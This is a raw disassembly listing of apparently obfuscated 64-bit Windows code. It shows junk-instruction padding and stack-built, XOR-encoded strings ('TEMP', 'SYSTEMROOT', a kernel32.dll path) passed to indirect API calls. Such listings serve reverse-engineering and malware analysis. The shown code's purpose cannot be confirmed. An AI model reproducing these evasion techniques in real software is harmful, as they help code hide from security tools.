   180003a20:	41 52                	push   %r10
   180003a22:	41 51                	push   %r9
   180003a24:	41 59                	pop    %r9
   180003a26:	41 5a                	pop    %r10
   180003a28:	b8 01 00 00 00       	mov    $0x1,%eax
   180003a2d:	48 83 c4 38          	add    $0x38,%rsp
   180003a31:	c3                   	ret
   180003a32:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180003a39:	1f 84 00 00 00 00 00 
   180003a40:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   180003a47:	c7 44 24 28 2f 00 00 	movl   $0x2f,0x28(%rsp)
   180003a4e:	00 
   180003a4f:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003a53:	b9 9a 02 00 00       	mov    $0x29a,%ecx
   180003a58:	e8 f3 e1 ff ff       	call   0x180001c50
   180003a5d:	90                   	nop
   180003a5e:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003a62:	e8 39 dd ff ff       	call   0x1800017a0
   180003a67:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   180003a6c:	ff 15 2e 27 02 00    	call   *0x2272e(%rip)        # 0x1800261a0
   180003a72:	ff 15 20 27 02 00    	call   *0x22720(%rip)        # 0x180026198
   180003a78:	c7 44 24 2c 0c b4 ed 	movl   $0xedb40c,0x2c(%rsp)
   180003a7f:	00 
   180003a80:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003a84:	48 89 c0             	mov    %rax,%rax
   180003a87:	90                   	nop
   180003a88:	4d 89 ff             	mov    %r15,%r15
   180003a8b:	48 8d 1b             	lea    (%rbx),%rbx
   180003a8e:	4d 8d 09             	lea    (%r9),%r9
   180003a91:	48 87 ed             	xchg   %rbp,%rbp
   180003a94:	48 89 ed             	mov    %rbp,%rbp
   180003a97:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003a9b:	4d 8d 12             	lea    (%r10),%r10
   180003a9e:	48 89 ff             	mov    %rdi,%rdi
   180003aa1:	57                   	push   %rdi
   180003aa2:	41 56                	push   %r14
   180003aa4:	41 5e                	pop    %r14
   180003aa6:	5f                   	pop    %rdi
   180003aa7:	48 87 db             	xchg   %rbx,%rbx
   180003aaa:	4d 8d 1b             	lea    (%r11),%r11
   180003aad:	48 8d 12             	lea    (%rdx),%rdx
   180003ab0:	31 c0                	xor    %eax,%eax
   180003ab2:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   180003ab9:	c3                   	ret
   180003aba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003ac0:	56                   	push   %rsi
   180003ac1:	57                   	push   %rdi
   180003ac2:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   180003ac9:	c7 44 24 4c 45 00 00 	movl   $0x45,0x4c(%rsp)
   180003ad0:	00 
   180003ad1:	4d 8d 3f             	lea    (%r15),%r15
   180003ad4:	4d 87 c0             	xchg   %r8,%r8
   180003ad7:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003adb:	4d 8d 12             	lea    (%r10),%r10
   180003ade:	4d 89 e4             	mov    %r12,%r12
   180003ae1:	4d 89 f6             	mov    %r14,%r14
   180003ae4:	48 89 f6             	mov    %rsi,%rsi
   180003ae7:	b9 9a 02 00 00       	mov    $0x29a,%ecx
   180003aec:	e8 ff d7 ff ff       	call   0x1800012f0
   180003af1:	90                   	nop
   180003af2:	90                   	nop
   180003af3:	90                   	nop
   180003af4:	e8 07 e3 ff ff       	call   0x180001e00
   180003af9:	b9 06 00 00 00       	mov    $0x6,%ecx
   180003afe:	ff 15 04 27 02 00    	call   *0x22704(%rip)        # 0x180026208
   180003b04:	48 87 c9             	xchg   %rcx,%rcx
   180003b07:	48 8d 12             	lea    (%rdx),%rdx
   180003b0a:	c7 44 24 3c 3c 00 00 	movl   $0x3c,0x3c(%rsp)
   180003b11:	00 
   180003b12:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003b16:	83 f0 68             	xor    $0x68,%eax
   180003b19:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180003b1e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003b22:	83 f0 79             	xor    $0x79,%eax
   180003b25:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180003b2a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003b2e:	83 f0 71             	xor    $0x71,%eax
   180003b31:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180003b36:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003b3a:	83 f0 6c             	xor    $0x6c,%eax
   180003b3d:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   180003b42:	66 c7 44 24 4a 00 00 	movw   $0x0,0x4a(%rsp)
   180003b49:	48 8d 4c 24 42       	lea    0x42(%rsp),%rcx
   180003b4e:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   180003b53:	48 89 f2             	mov    %rsi,%rdx
   180003b56:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003b5c:	ff 15 76 25 02 00    	call   *0x22576(%rip)        # 0x1800260d8
   180003b62:	4d 87 ff             	xchg   %r15,%r15
   180003b65:	51                   	push   %rcx
   180003b66:	41 54                	push   %r12
   180003b68:	41 5c                	pop    %r12
   180003b6a:	59                   	pop    %rcx
   180003b6b:	48 8d 00             	lea    (%rax),%rax
   180003b6e:	4d 89 ff             	mov    %r15,%r15
   180003b71:	48 8d 09             	lea    (%rcx),%rcx
   180003b74:	c7 44 24 50 af 0e 76 	movl   $0x760eaf,0x50(%rsp)
   180003b7b:	00 
   180003b7c:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003b80:	48 89 c9             	mov    %rcx,%rcx
   180003b83:	48 8d 3f             	lea    (%rdi),%rdi
   180003b86:	4d 87 f6             	xchg   %r14,%r14
   180003b89:	50                   	push   %rax
   180003b8a:	48 87 ed             	xchg   %rbp,%rbp
   180003b8d:	58                   	pop    %rax
   180003b8e:	41 51                	push   %r9
   180003b90:	52                   	push   %rdx
   180003b91:	5a                   	pop    %rdx
   180003b92:	41 59                	pop    %r9
   180003b94:	e8 77 df ff ff       	call   0x180001b10
   180003b99:	b9 9a 01 00 00       	mov    $0x19a,%ecx
   180003b9e:	e8 bd e3 ff ff       	call   0x180001f60
   180003ba3:	48 8d 1b             	lea    (%rbx),%rbx
   180003ba6:	4d 8d 36             	lea    (%r14),%r14
   180003ba9:	4d 89 ff             	mov    %r15,%r15
   180003bac:	48 8b 3d 9d 25 02 00 	mov    0x2259d(%rip),%rdi        # 0x180026150
   180003bb3:	ff d7                	call   *%rdi
   180003bb5:	90                   	nop
   180003bb6:	90                   	nop
   180003bb7:	4d 89 db             	mov    %r11,%r11
   180003bba:	e8 31 f1 ff ff       	call   0x180002cf0
   180003bbf:	48 8d 00             	lea    (%rax),%rax
   180003bc2:	4d 89 c9             	mov    %r9,%r9
   180003bc5:	4d 87 c0             	xchg   %r8,%r8
   180003bc8:	ff d7                	call   *%rdi
   180003bca:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003bce:	48 87 c9             	xchg   %rcx,%rcx
   180003bd1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003bd6:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180003bdd:	00 
   180003bde:	4c 8d 05 77 ec 01 00 	lea    0x1ec77(%rip),%r8        # 0x18002285c
   180003be5:	31 c9                	xor    %ecx,%ecx
   180003be7:	31 d2                	xor    %edx,%edx
   180003be9:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180003bef:	ff 15 4b 26 02 00    	call   *0x2264b(%rip)        # 0x180026240
   180003bf5:	4d 87 e4             	xchg   %r12,%r12
   180003bf8:	4d 89 ed             	mov    %r13,%r13
   180003bfb:	4d 87 c0             	xchg   %r8,%r8
   180003bfe:	c7 44 24 50 c4 de 48 	movl   $0x48dec4,0x50(%rsp)
   180003c05:	00 
   180003c06:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003c0a:	e8 71 f2 ff ff       	call   0x180002e80
   180003c0f:	55                   	push   %rbp
   180003c10:	90                   	nop
   180003c11:	5d                   	pop    %rbp
   180003c12:	41 50                	push   %r8
   180003c14:	90                   	nop
   180003c15:	41 58                	pop    %r8
   180003c17:	55                   	push   %rbp
   180003c18:	5d                   	pop    %rbp
   180003c19:	48 89 c9             	mov    %rcx,%rcx
   180003c1c:	4d 87 c0             	xchg   %r8,%r8
   180003c1f:	48 89 e4             	mov    %rsp,%rsp
   180003c22:	48 87 ed             	xchg   %rbp,%rbp
   180003c25:	e8 06 da ff ff       	call   0x180001630
   180003c2a:	4d 87 c0             	xchg   %r8,%r8
   180003c2d:	90                   	nop
   180003c2e:	31 c0                	xor    %eax,%eax
   180003c30:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   180003c37:	5f                   	pop    %rdi
   180003c38:	5e                   	pop    %rsi
   180003c39:	c3                   	ret
   180003c3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003c40:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180003c47:	b9 f0 01 00 00       	mov    $0x1f0,%ecx
   180003c4c:	e8 3f db ff ff       	call   0x180001790
   180003c51:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180003c56:	b9 04 01 00 00       	mov    $0x104,%ecx
   180003c5b:	ff 15 27 25 02 00    	call   *0x22527(%rip)        # 0x180026188
   180003c61:	41 57                	push   %r15
   180003c63:	41 5f                	pop    %r15
   180003c65:	ff 15 45 24 02 00    	call   *0x22445(%rip)        # 0x1800260b0
   180003c6b:	ff 15 37 25 02 00    	call   *0x22537(%rip)        # 0x1800261a8
   180003c71:	48 89 d2             	mov    %rdx,%rdx
   180003c74:	90                   	nop
   180003c75:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180003c7a:	31 c9                	xor    %ecx,%ecx
   180003c7c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003c82:	ff 15 90 24 02 00    	call   *0x22490(%rip)        # 0x180026118
   180003c88:	c7 44 24 20 8a 27 77 	movl   $0x77278a,0x20(%rsp)
   180003c8f:	00 
   180003c90:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180003c94:	41 53                	push   %r11
   180003c96:	41 5b                	pop    %r11
   180003c98:	56                   	push   %rsi
   180003c99:	4d 87 f6             	xchg   %r14,%r14
   180003c9c:	5e                   	pop    %rsi
   180003c9d:	57                   	push   %rdi
   180003c9e:	50                   	push   %rax
   180003c9f:	58                   	pop    %rax
   180003ca0:	5f                   	pop    %rdi
   180003ca1:	48 8d 1b             	lea    (%rbx),%rbx
   180003ca4:	48 8d 3f             	lea    (%rdi),%rdi
   180003ca7:	48 87 ed             	xchg   %rbp,%rbp
   180003caa:	4d 8d 00             	lea    (%r8),%r8
   180003cad:	4d 87 e4             	xchg   %r12,%r12
   180003cb0:	48 8d 12             	lea    (%rdx),%rdx
   180003cb3:	4d 89 db             	mov    %r11,%r11
   180003cb6:	4d 89 f6             	mov    %r14,%r14
   180003cb9:	31 c0                	xor    %eax,%eax
   180003cbb:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   180003cc2:	c3                   	ret
   180003cc3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180003cca:	84 00 00 00 00 00 
   180003cd0:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180003cd7:	b9 0b 01 00 00       	mov    $0x10b,%ecx
   180003cdc:	e8 bf e5 ff ff       	call   0x1800022a0
   180003ce1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003ce6:	ba 04 01 00 00       	mov    $0x104,%edx
   180003ceb:	ff 15 7f 24 02 00    	call   *0x2247f(%rip)        # 0x180026170
   180003cf1:	41 56                	push   %r14
   180003cf3:	41 5e                	pop    %r14
   180003cf5:	4d 89 d2             	mov    %r10,%r10
   180003cf8:	4d 8d 12             	lea    (%r10),%r10
   180003cfb:	ff 15 b7 23 02 00    	call   *0x223b7(%rip)        # 0x1800260b8
   180003d01:	50                   	push   %rax
   180003d02:	58                   	pop    %rax
   180003d03:	c7 44 24 20 18 92 cc 	movl   $0xcc9218,0x20(%rsp)
   180003d0a:	00 
   180003d0b:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180003d0f:	48 89 e4             	mov    %rsp,%rsp
   180003d12:	90                   	nop
   180003d13:	52                   	push   %rdx
   180003d14:	41 52                	push   %r10
   180003d16:	41 5a                	pop    %r10
   180003d18:	5a                   	pop    %rdx
   180003d19:	41 53                	push   %r11
   180003d1b:	90                   	nop
   180003d1c:	41 5b                	pop    %r11
   180003d1e:	e8 dd e0 ff ff       	call   0x180001e00
   180003d23:	48 87 ff             	xchg   %rdi,%rdi
   180003d26:	b8 01 00 00 00       	mov    $0x1,%eax
   180003d2b:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   180003d32:	c3                   	ret
   180003d33:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   180003d3a:	84 00 00 00 00 00 
   180003d40:	56                   	push   %rsi
   180003d41:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180003d48:	b9 0c 03 00 00       	mov    $0x30c,%ecx
   180003d4d:	e8 4e e5 ff ff       	call   0x1800022a0
   180003d52:	56                   	push   %rsi
   180003d53:	5e                   	pop    %rsi
   180003d54:	b9 00 04 00 00       	mov    $0x400,%ecx
   180003d59:	ba 01 00 00 00       	mov    $0x1,%edx
   180003d5e:	ff 15 b4 24 02 00    	call   *0x224b4(%rip)        # 0x180026218
   180003d64:	48 8d 15 17 eb 01 00 	lea    0x1eb17(%rip),%rdx        # 0x180022882
   180003d6b:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   180003d70:	b9 01 00 00 00       	mov    $0x1,%ecx
   180003d75:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180003d7b:	ff 15 e7 23 02 00    	call   *0x223e7(%rip)        # 0x180026168
   180003d81:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003d86:	31 c9                	xor    %ecx,%ecx
   180003d88:	ff 15 ea 22 02 00    	call   *0x222ea(%rip)        # 0x180026078
   180003d8e:	4d 89 f6             	mov    %r14,%r14
   180003d91:	4d 89 ff             	mov    %r15,%r15
   180003d94:	4d 89 e4             	mov    %r12,%r12
   180003d97:	48 87 e4             	xchg   %rsp,%rsp
   180003d9a:	41 57                	push   %r15
   180003d9c:	41 5f                	pop    %r15
   180003d9e:	c7 44 24 50 55 2f dd 	movl   $0xdd2f55,0x50(%rsp)
   180003da5:	00 
   180003da6:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003daa:	41 55                	push   %r13
   180003dac:	41 5d                	pop    %r13
   180003dae:	b9 ce 02 00 00       	mov    $0x2ce,%ecx
   180003db3:	e8 08 dd ff ff       	call   0x180001ac0
   180003db8:	90                   	nop
   180003db9:	4d 87 db             	xchg   %r11,%r11
   180003dbc:	48 87 c9             	xchg   %rcx,%rcx
   180003dbf:	90                   	nop
   180003dc0:	e8 7b d7 ff ff       	call   0x180001540
   180003dc5:	ff 15 f5 22 02 00    	call   *0x222f5(%rip)        # 0x1800260c0
   180003dcb:	89 c6                	mov    %eax,%esi
   180003dcd:	ff 15 c5 23 02 00    	call   *0x223c5(%rip)        # 0x180026198
   180003dd3:	31 f0                	xor    %esi,%eax
   180003dd5:	89 44 24 50          	mov    %eax,0x50(%rsp)
   180003dd9:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003ddd:	48 87 d2             	xchg   %rdx,%rdx
   180003de0:	90                   	nop
   180003de1:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%rsp)
   180003de8:	00 
   180003de9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003dee:	ff 15 cc 23 02 00    	call   *0x223cc(%rip)        # 0x1800261c0
   180003df4:	c7 44 24 2c 4e 00 00 	movl   $0x4e,0x2c(%rsp)
   180003dfb:	00 
   180003dfc:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e00:	83 f0 1d             	xor    $0x1d,%eax
   180003e03:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180003e08:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e0c:	83 f0 17             	xor    $0x17,%eax
   180003e0f:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003e14:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e18:	83 f0 1d             	xor    $0x1d,%eax
   180003e1b:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003e20:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e24:	83 f0 1a             	xor    $0x1a,%eax
   180003e27:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003e2c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e30:	83 f0 0b             	xor    $0xb,%eax
   180003e33:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003e38:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e3c:	83 f0 03             	xor    $0x3,%eax
   180003e3f:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003e44:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e48:	83 f0 1c             	xor    $0x1c,%eax
   180003e4b:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180003e50:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e54:	83 f0 01             	xor    $0x1,%eax
   180003e57:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180003e5c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e60:	83 f0 01             	xor    $0x1,%eax
   180003e63:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180003e68:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003e6c:	83 f0 1a             	xor    $0x1a,%eax
   180003e6f:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180003e74:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180003e7b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003e80:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003e85:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003e8b:	ff 15 47 22 02 00    	call   *0x22247(%rip)        # 0x1800260d8
   180003e91:	4d 89 f6             	mov    %r14,%r14
   180003e94:	48 89 c9             	mov    %rcx,%rcx
   180003e97:	4d 8d 12             	lea    (%r10),%r10
   180003e9a:	e8 a1 d6 ff ff       	call   0x180001540
   180003e9f:	48 87 f6             	xchg   %rsi,%rsi
   180003ea2:	41 54                	push   %r12
   180003ea4:	4d 87 f6             	xchg   %r14,%r14
   180003ea7:	41 5c                	pop    %r12
   180003ea9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003eae:	ff 15 c4 22 02 00    	call   *0x222c4(%rip)        # 0x180026178
   180003eb4:	c7 44 24 50 8f c0 1e 	movl   $0x1ec08f,0x50(%rsp)
   180003ebb:	00 
   180003ebc:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003ec0:	4d 87 ff             	xchg   %r15,%r15
   180003ec3:	48 89 db             	mov    %rbx,%rbx
   180003ec6:	4d 89 e4             	mov    %r12,%r12
   180003ec9:	4d 87 c9             	xchg   %r9,%r9
   180003ecc:	4d 87 f6             	xchg   %r14,%r14
   180003ecf:	4d 8d 1b             	lea    (%r11),%r11
   180003ed2:	48 8d 3f             	lea    (%rdi),%rdi
   180003ed5:	4d 8d 12             	lea    (%r10),%r10
   180003ed8:	b9 7d 01 00 00       	mov    $0x17d,%ecx
   180003edd:	e8 6e dd ff ff       	call   0x180001c50
   180003ee2:	4d 89 ff             	mov    %r15,%r15
   180003ee5:	90                   	nop
   180003ee6:	ff 15 0c 22 02 00    	call   *0x2220c(%rip)        # 0x1800260f8
   180003eec:	4d 87 ed             	xchg   %r13,%r13
   180003eef:	48 89 db             	mov    %rbx,%rbx
   180003ef2:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003ef6:	e8 85 ef ff ff       	call   0x180002e80
   180003efb:	ff 15 af 21 02 00    	call   *0x221af(%rip)        # 0x1800260b0
   180003f01:	e8 0a dc ff ff       	call   0x180001b10
   180003f06:	41 50                	push   %r8
   180003f08:	4d 89 c0             	mov    %r8,%r8
   180003f0b:	90                   	nop
   180003f0c:	41 58                	pop    %r8
   180003f0e:	e8 dd ed ff ff       	call   0x180002cf0
   180003f13:	c7 44 24 50 5c 4b 0b 	movl   $0xb4b5c,0x50(%rsp)
   180003f1a:	00 
   180003f1b:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003f1f:	4d 8d 00             	lea    (%r8),%r8
   180003f22:	4d 87 f6             	xchg   %r14,%r14
   180003f25:	4d 89 ff             	mov    %r15,%r15
   180003f28:	90                   	nop
   180003f29:	48 87 e4             	xchg   %rsp,%rsp
   180003f2c:	48 8d 3f             	lea    (%rdi),%rdi
   180003f2f:	48 89 c0             	mov    %rax,%rax
   180003f32:	48 87 e4             	xchg   %rsp,%rsp
   180003f35:	52                   	push   %rdx
   180003f36:	5a                   	pop    %rdx
   180003f37:	b8 01 00 00 00       	mov    $0x1,%eax
   180003f3c:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   180003f43:	5e                   	pop    %rsi
   180003f44:	c3                   	ret
   180003f45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   180003f4c:	00 00 00 00 
   180003f50:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   180003f57:	c7 44 24 2c 63 00 00 	movl   $0x63,0x2c(%rsp)
   180003f5e:	00 
   180003f5f:	4d 89 d2             	mov    %r10,%r10
   180003f62:	4d 87 ed             	xchg   %r13,%r13
   180003f65:	4d 89 c0             	mov    %r8,%r8
   180003f68:	48 87 ed             	xchg   %rbp,%rbp
   180003f6b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003f6f:	b9 5a 01 00 00       	mov    $0x15a,%ecx
   180003f74:	e8 77 d3 ff ff       	call   0x1800012f0
   180003f79:	48 8d 36             	lea    (%rsi),%rsi
   180003f7c:	48 89 e4             	mov    %rsp,%rsp
   180003f7f:	4d 89 ed             	mov    %r13,%r13
   180003f82:	4d 89 ff             	mov    %r15,%r15
   180003f85:	ff 15 b5 21 02 00    	call   *0x221b5(%rip)        # 0x180026140
   180003f8b:	90                   	nop
   180003f8c:	48 87 c9             	xchg   %rcx,%rcx
   180003f8f:	90                   	nop
   180003f90:	c7 44 24 28 71 00 00 	movl   $0x71,0x28(%rsp)
   180003f97:	00 
   180003f98:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003f9c:	83 f0 32             	xor    $0x32,%eax
   180003f9f:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180003fa4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fa8:	83 f0 4b             	xor    $0x4b,%eax
   180003fab:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003fb0:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fb4:	83 f0 2d             	xor    $0x2d,%eax
   180003fb7:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003fbc:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fc0:	83 f0 26             	xor    $0x26,%eax
   180003fc3:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003fc8:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fcc:	83 f0 18             	xor    $0x18,%eax
   180003fcf:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003fd4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fd8:	83 f0 1f             	xor    $0x1f,%eax
   180003fdb:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003fe0:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003fe4:	83 f0 15             	xor    $0x15,%eax
   180003fe7:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180003fec:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003ff0:	83 f0 1e             	xor    $0x1e,%eax
   180003ff3:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180003ff8:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180003ffc:	83 f0 06             	xor    $0x6,%eax
   180003fff:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180004004:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004008:	83 f0 02             	xor    $0x2,%eax
   18000400b:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180004010:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004014:	83 f0 2d             	xor    $0x2d,%eax
   180004017:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   18000401c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004020:	83 f0 22             	xor    $0x22,%eax
   180004023:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180004028:	8b 44 24 28          	mov    0x28(%rsp),%eax
   18000402c:	83 f0 08             	xor    $0x8,%eax
   18000402f:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   180004034:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004038:	83 f0 02             	xor    $0x2,%eax
   18000403b:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180004040:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004044:	83 f0 05             	xor    $0x5,%eax
   180004047:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   18000404c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004050:	83 f0 14             	xor    $0x14,%eax
   180004053:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   180004058:	8b 44 24 28          	mov    0x28(%rsp),%eax
   18000405c:	83 f0 1c             	xor    $0x1c,%eax
   18000405f:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   180004064:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004068:	83 f0 42             	xor    $0x42,%eax
   18000406b:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180004070:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004074:	83 f0 43             	xor    $0x43,%eax
   180004077:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   18000407c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004080:	83 f0 2d             	xor    $0x2d,%eax
   180004083:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180004088:	8b 44 24 28          	mov    0x28(%rsp),%eax
   18000408c:	83 f0 1a             	xor    $0x1a,%eax
   18000408f:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   180004094:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004098:	83 f0 14             	xor    $0x14,%eax
   18000409b:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   1800040a0:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040a4:	83 f0 03             	xor    $0x3,%eax
   1800040a7:	66 89 44 24 5c       	mov    %ax,0x5c(%rsp)
   1800040ac:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040b0:	83 f0 1f             	xor    $0x1f,%eax
   1800040b3:	66 89 44 24 5e       	mov    %ax,0x5e(%rsp)
   1800040b8:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040bc:	83 f0 14             	xor    $0x14,%eax
   1800040bf:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1800040c4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040c8:	83 f0 1d             	xor    $0x1d,%eax
   1800040cb:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   1800040d0:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040d4:	83 f0 42             	xor    $0x42,%eax
   1800040d7:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   1800040dc:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040e0:	83 f0 43             	xor    $0x43,%eax
   1800040e3:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   1800040e8:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040ec:	83 f0 5f             	xor    $0x5f,%eax
   1800040ef:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   1800040f4:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800040f8:	83 f0 15             	xor    $0x15,%eax
   1800040fb:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   180004100:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004104:	83 f0 1d             	xor    $0x1d,%eax
   180004107:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   18000410c:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180004110:	83 f0 1d             	xor    $0x1d,%eax
   180004113:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180004118:	66 c7 44 24 70 00 00 	movw   $0x0,0x70(%rsp)
   18000411f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004124:	ff 15 b6 1f 02 00    	call   *0x21fb6(%rip)        # 0x1800260e0
   18000412a:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000412e:	48 8d 3f             	lea    (%rdi),%rdi
   180004131:	ff 15 79 1f 02 00    	call   *0x21f79(%rip)        # 0x1800260b0
   180004137:	57                   	push   %rdi
   180004138:	5f                   	pop    %rdi
   180004139:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   18000413e:	b9 00 04 00 00       	mov    $0x400,%ecx
   180004143:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180004148:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   18000414e:	ff 15 b4 1f 02 00    	call   *0x21fb4(%rip)        # 0x180026108
